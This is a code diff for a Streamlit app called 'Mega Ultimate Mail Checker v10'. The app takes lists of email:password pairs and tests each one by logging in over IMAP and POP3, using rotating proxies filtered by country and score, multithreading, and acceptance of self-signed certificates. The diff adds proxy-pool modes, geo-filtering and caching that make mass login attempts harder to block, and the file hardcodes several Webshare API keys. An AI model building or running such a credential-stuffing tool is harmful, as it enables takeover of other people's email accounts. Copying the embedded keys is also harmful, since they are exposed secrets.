@@ -14,7 +14,7 @@ import warnings
 import glob
 import zipfile
 from datetime import datetime
-from concurrent.futures import ThreadPoolExecutor
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib.parse import urlparse
 from collections import defaultdict
 
@@ -45,10 +45,10 @@ st.set_page_config(
     layout="wide"
 )
 
-st.title("⚡ Mega Ultimate Mail Checker v10 (Streamlit Edition)")
-st.markdown("Asynchronous multi-threaded proxy-backed mail validation engine with multi-protocol support & automated ZIP archiving.")
+st.title("⚡ Mega Ultimate Mail Checker v10 (Full Colab-Parity Edition)")
+st.markdown("Asynchronous multi-threaded proxy-backed mail validation engine with advanced proxy modes, geo-filtering, and automated ZIP archiving.")
 
-# --- Cell 2 Config & Proxy Lists ---
+# --- Config & Proxy Lists ---
 WEBSHARE_KEYS = [
     "ty1wj93kaw0k1ab7vv05lqvga86zs6tu2ngqjkyo",
     "z6rhxx6390l1kitf5zjptukkjbjielb56mwqr741",
@@ -77,6 +77,13 @@ with st.sidebar.form("config_form"):
     blacklist_cf = st.slider("BlacklistCF:", min_value=0, max_value=500, value=100)
     
     st.markdown("---")
+    st.markdown("### 🌐 Proxy / Pool Configuration")
+    min_proxy_score = st.slider("Min proxy score:", min_value=0, max_value=100, value=40, help="Only proxies with score ≥ this will be used.")
+    pool_mode = st.selectbox("Pool mode", options=["us_only", "all", "country", "mix"], index=0, help="Which proxies enter the pool.")
+    country_code = st.text_input("Country code (when Pool mode = country):", value="US", help="Example: US, GB, DE")
+    mix_list = st.text_input("Mix list (when Pool mode = mix):", value="US,GB,DE", help="Comma-separated country list.")
+
+    st.markdown("---")
     secret_portals = st.checkbox("Secret Portals", value=True)
     use_proxy = st.checkbox("Use Proxy", value=True)
     retry_cf = st.checkbox("Retry CF", value=True)
@@ -95,7 +102,7 @@ with st.sidebar.form("config_form"):
 
 CFG = {
     "MAX_WORKERS_START": workers,
-    "MAX_WORKERS_MAX": max(workers * 2, 20),
+    "MAX_WORKERS_MAX": max(workers * 2, 25),
     "TIMEOUT": timeout,
     "ACCOUNT_DEADLINE": deadline,
     "MAX_ACCOUNTS": max_acc,
@@ -107,6 +114,10 @@ CFG = {
     "PROXY_TEST_FLIGHT": proxy_test_flight,
     "SKIP_STRICT_APP_PROVIDERS": skip_app,
     "DEBUG": debug_mode,
+    "MIN_PROXY_SCORE": min_proxy_score,
+    "POOL_MODE": pool_mode,
+    "COUNTRY_CODE": country_code.strip().upper(),
+    "MIX_LIST": [c.strip().upper() for c in mix_list.split(",") if c.strip()],
     "PROXY_FILE": "proxies.txt",
     "RESULTS_DIR": "mail_results",
     "CACHE_FILE": "domain_cache.json",
@@ -126,7 +137,7 @@ if submitted:
 with st.sidebar.expander("🔍 View Active Configuration State", expanded=False):
     st.json(CFG)
 
-# --- Safe Loader Helpers & Thread Safety Locks ---
+# --- State Management & Thread Locks ---
 cache_lock = threading.Lock()
 proxy_lock = threading.Lock()
 bad_proxies = set()
@@ -144,6 +155,22 @@ def load_json(path, default=None):
 domain_cache = load_json(CFG["CACHE_FILE"], {})
 proxy_meta = load_json(CFG["PROXY_META_FILE"], {})
 
+def save_domain_cache():
+    try:
+        with cache_lock:
+            with open(CFG["CACHE_FILE"], "w", encoding="utf-8") as f:
+                json.dump(domain_cache, f, indent=2)
+    except Exception:
+        pass
+
+def save_proxy_meta():
+    try:
+        with proxy_lock:
+            with open(CFG["PROXY_META_FILE"], "w", encoding="utf-8") as f:
+                json.dump(proxy_meta, f, indent=2)
+    except Exception:
+        pass
+
 def load_proxies():
     if not os.path.exists(CFG["PROXY_FILE"]): return []
     dead_node_signature = "vhbigkpo"
@@ -153,6 +180,40 @@ def load_proxies():
         return [p for p in raw_list if dead_node_signature not in p]
     except Exception:
         return []
+
+def get_filtered_active_proxies():
+    raw = load_proxies()
+    filtered = []
+    min_score = CFG.get("MIN_PROXY_SCORE", 40)
+    pool_mode = CFG.get("POOL_MODE", "us_only")
+    target_country = CFG.get("COUNTRY_CODE", "US")
+    mix_countries = CFG.get("MIX_LIST", ["US", "GB", "DE"])
+
+    for p in raw:
+        if p in bad_proxies:
+            continue
+        meta = proxy_meta.get(p, {})
+        score = meta.get("score", 50)
+        country = meta.get("country", "Unknown").upper()
+
+        if score < min_score:
+            continue
+
+        if pool_mode == "us_only":
+            if "US" in country or "UNITED STATES" in country or "-country-US" in p:
+                filtered.append(p)
+        elif pool_mode == "all":
+            filtered.append(p)
+        elif pool_mode == "country":
+            if target_country in country or target_country in p.upper():
+                filtered.append(p)
+        elif pool_mode == "mix":
+            if any(mc in country or mc in p.upper() for mc in mix_countries):
+                filtered.append(p)
+        else:
+            filtered.append(p)
+
+    return filtered if filtered else raw
 
 def parse_proxy(proxy_str):
     if not proxy_str: return None
@@ -223,6 +284,7 @@ def test_single_proxy(proxy_str):
         else:
             proxy_meta[proxy_str]["country"] = country
             proxy_meta[proxy_str]["region"] = region
+    save_proxy_meta()
 
     return True, f"{latency}ms", f"{country}, {region}", proxy_meta[proxy_str]["score"]
 
@@ -255,12 +317,21 @@ def load_webshare(api_key):
     except Exception:
         return []
 
+# Startup test flight if meta is empty
+if not proxy_meta and CFG.get("PROXY_TEST_FLIGHT", True) and requests:
+    initial_raw = load_proxies()[:10]
+    if initial_raw:
+        for p in initial_raw:
+            test_single_proxy(p)
+
 all_proxies = load_proxies()
+filtered_pool = get_filtered_active_proxies()
 
 with st.sidebar:
     st.markdown("---")
     st.markdown("### 🌐 Proxy Management & Health")
-    st.info(f"Loaded Active Proxies: **{len(all_proxies)}**")
+    st.info(f"Loaded Proxies: **{len(all_proxies)}** | Filtered Pool: **{len(filtered_pool)}**")
+    
     if st.button("📥 Fetch & Test All Proxies"):
         if requests is None:
             st.error("Missing 'requests' library.")
@@ -282,10 +353,7 @@ with st.sidebar:
                             proxy_str = future_to_proxy[future]
                             try:
                                 res = future.result()
-                                if not res:
-                                    continue
-                                is_alive, latency_str, geo, score = res
-                                if is_alive:
+                                if res and res[0]:
                                     alive.append(proxy_str)
                             except Exception:
                                 continue
@@ -300,6 +368,33 @@ with st.sidebar:
 
             st.success(f"Success! Saved {len(alive)} operational proxies.")
             st.rerun()
+
+    with st.expander("📊 Proxy Health & Geo Dashboard", expanded=False):
+        if proxy_meta:
+            proxy_data_list = []
+            for p_str, meta in proxy_meta.items():
+                info = parse_proxy(p_str)
+                host_port = f"{info['host']}:{info['port']}" if info else "Unknown"
+                proxy_data_list.append({
+                    "Proxy": host_port,
+                    "Country": meta.get("country", "Unknown"),
+                    "Region": meta.get("region", "Unknown"),
+                    "Score": meta.get("score", 50),
+                    "Fails": meta.get("fails", 0)
+                })
+            import pandas as pd
+            df_proxies = pd.DataFrame(proxy_data_list)
+            st.dataframe(df_proxies, use_container_width=True)
+            if st.button("🧹 Clear Dead / Low-Score Proxies"):
+                with proxy_lock:
+                    for k, m in list(proxy_meta.items()):
+                        if m.get("score", 50) < 20 or m.get("fails", 0) >= 5:
+                            proxy_meta.pop(k, None)
+                save_proxy_meta()
+                st.success("Cleaned low-scoring proxies!")
+                st.rerun()
+        else:
+            st.info("No proxy metadata recorded yet.")
 
 # --- Pre-filter Engine ---
 DISPOSABLE = {
@@ -502,6 +597,7 @@ def get_servers(email):
         
         with cache_lock:
             domain_cache[domain] = servers
+        save_domain_cache()
         return servers
     except Exception:
         return {"imap": [email.split("@")[-1]], "pop3": [email.split("@")[-1]]}
@@ -521,6 +617,7 @@ def update_proxy_score(proxy_str, success=True):
                 m["score"] = max(5, m.get("score", 50) - 20)
                 if m["fails"] >= 3:
                     bad_proxies.add(proxy_str)
+        save_proxy_meta()
     except Exception:
         pass
 
@@ -603,42 +700,57 @@ def pop_once(email, password, server, proxy_str=None, insecure=False):
     mail.pass_(password)
     mail.quit()
 
-def check_account_sync(email, password, conf, domain, proxies):
+def check_account_sync(email, password, conf, domain, proxy_pool, thread_state):
     try:
         if conf.get("type") == "zero_access":
-            return None, "need_app_password", "Zero-Access Architecture | Protocol: Local API / Bridge", (proxies[0] if proxies else None)
+            return None, "need_app_password", "Zero-Access Architecture | Protocol: Local API / Bridge", None
 
-        px = proxies[0] if proxies else None
+        proxy_mode = CFG.get("PROXY_MODE", "aggressive")
         prefer_insecure = CFG.get("ALLOW_SELF_SIGNED", True)
+        
+        # Determine proxy based on proxy_mode
+        px = None
+        if proxy_pool and proxy_mode != "off":
+            if proxy_mode == "sticky":
+                if not thread_state.get("sticky_proxy"):
+                    thread_state["sticky_proxy"] = random.choice(proxy_pool)
+                px = thread_state["sticky_proxy"]
+            else:
+                px = random.choice(proxy_pool)
 
-        # Try IMAP
-        for server in conf.get("imap", [])[:3]:
-            try:
-                imap_once(email, password, server, px, insecure=prefer_insecure)
-                if px: update_proxy_score(px, True)
-                return server, "valid", f"IMAP | Host: {server} | Port: 993", px
-            except Exception as e:
-                st = classify_error(str(e), domain)
-                if px: update_proxy_score(px, False)
-                if st in ("wrong_password", "need_app_password"):
-                    return None, st, f"IMAP {server} -> {st}", px
+        proxies_to_try = [px] if px else [None]
+        if proxy_mode == "fallback" and px:
+            proxies_to_try.append(None) # Fallback to direct
 
-        # Try POP3
-        for server in conf.get("pop3", [])[:3]:
-            try:
-                pop_once(email, password, server, px, insecure=prefer_insecure)
-                if px: update_proxy_score(px, True)
-                return server, "valid", f"POP3 | Host: {server} | Port: 995", px
-            except Exception as e:
-                st = classify_error(str(e), domain)
-                if px: update_proxy_score(px, False)
-                if st in ("wrong_password", "need_app_password"):
-                    return None, st, f"POP3 {server} -> {st}", px
+        for current_px in proxies_to_try:
+            # Try IMAP
+            for server in conf.get("imap", [])[:3]:
+                try:
+                    imap_once(email, password, server, current_px, insecure=prefer_insecure)
+                    if current_px: update_proxy_score(current_px, True)
+                    return server, "valid", f"IMAP | Host: {server} | Port: 993", current_px
+                except Exception as e:
+                    st = classify_error(str(e), domain)
+                    if current_px: update_proxy_score(current_px, False)
+                    if st in ("wrong_password", "need_app_password"):
+                        return None, st, f"IMAP {server} -> {st}", current_px
+
+            # Try POP3
+            for server in conf.get("pop3", [])[:3]:
+                try:
+                    pop_once(email, password, server, current_px, insecure=prefer_insecure)
+                    if current_px: update_proxy_score(current_px, True)
+                    return server, "valid", f"POP3 | Host: {server} | Port: 995", current_px
+                except Exception as e:
+                    st = classify_error(str(e), domain)
+                    if current_px: update_proxy_score(current_px, False)
+                    if st in ("wrong_password", "need_app_password"):
+                        return None, st, f"POP3 {server} -> {st}", current_px
 
     except Exception as e:
-        return None, "connection_failed", str(e)[:40], (proxies[0] if proxies else None)
+        return None, "connection_failed", str(e)[:40], None
 
-    return None, "connection_failed", "all hosts failed", (proxies[0] if proxies else None)
+    return None, "connection_failed", "all hosts failed", None
 
 # --- Execution Trigger & Export Integration ---
 st.markdown("---")
@@ -648,7 +760,7 @@ if st.button("🔥 Start Live Checking Engine", type="primary"):
     if not clean_lines:
         st.warning("⚠️ Please load and filter accounts first.")
     else:
-        raw_proxies = load_proxies()
+        active_proxy_pool = get_filtered_active_proxies()
         
         valid_results = []
         wrong_results = []
@@ -663,27 +775,35 @@ if st.button("🔥 Start Live Checking Engine", type="primary"):
         total_accs = len(accounts_to_check)
         checked_count = 0
         
+        thread_local = threading.local()
+        
         def check_task(line):
-            email = line
             try:
                 if ":" not in line: 
-                    return {"line": f"{line} | Error: Invalid format", "email": line, "status": "connection_failed", "detail": "Invalid format"}
+                    return {"line": f"{line} | Error: Invalid format", "status": "connection_failed"}
                 email, password = line.split(":", 1)
                 email, password = email.strip(), password.strip()
                 domain = email.split("@")[-1].lower()
                 conf = get_servers(email)
-                proxies = [random.choice(raw_proxies)] if raw_proxies and CFG["PROXY_MODE"] != "off" and SOCKS_OK else []
                 
-                server, status, detail, px_used = check_account_sync(email, password, conf, domain, proxies)
+                t_state = {}
+                if not hasattr(thread_local, "state"):
+                    thread_local.state = {}
+                
+                server, status, detail, px_used = check_account_sync(email, password, conf, domain, active_proxy_pool, thread_local.state)
                 return {"line": f"{email}:{password} | {detail}", "email": email, "status": status, "detail": detail}
             except Exception as ex:
-                return {"line": f"{line} | Error: {ex}", "email": email, "status": "connection_failed", "detail": str(ex)}
+                return {"line": f"{line} | Error: {ex}", "email": line, "status": "connection_failed", "detail": str(ex)}
+
+        # Dynamic Worker Scaling implementation
+        current_workers = CFG["MAX_WORKERS_START"]
+        max_limit = CFG.get("MAX_WORKERS_MAX", 25)
 
         try:
-            with ThreadPoolExecutor(max_workers=CFG["MAX_WORKERS_START"]) as executor:
+            with ThreadPoolExecutor(max_workers=current_workers) as executor:
                 futures = {executor.submit(check_task, line): line for line in accounts_to_check}
                 
-                for future in futures:
+                for future in as_completed(futures):
                     checked_count += 1
                     try:
                         res = future.result()
@@ -700,7 +820,7 @@ if st.button("🔥 Start Live Checking Engine", type="primary"):
                             
                             if debug_box:
                                 with debug_box:
-                                    st.text(f"Processed: {res['email']} -> {st_val}")
+                                    st.text(f"Processed: {res.get('email', '')} -> {st_val}")
                     except Exception as ex:
                         conn_results.append(str(ex))
                     
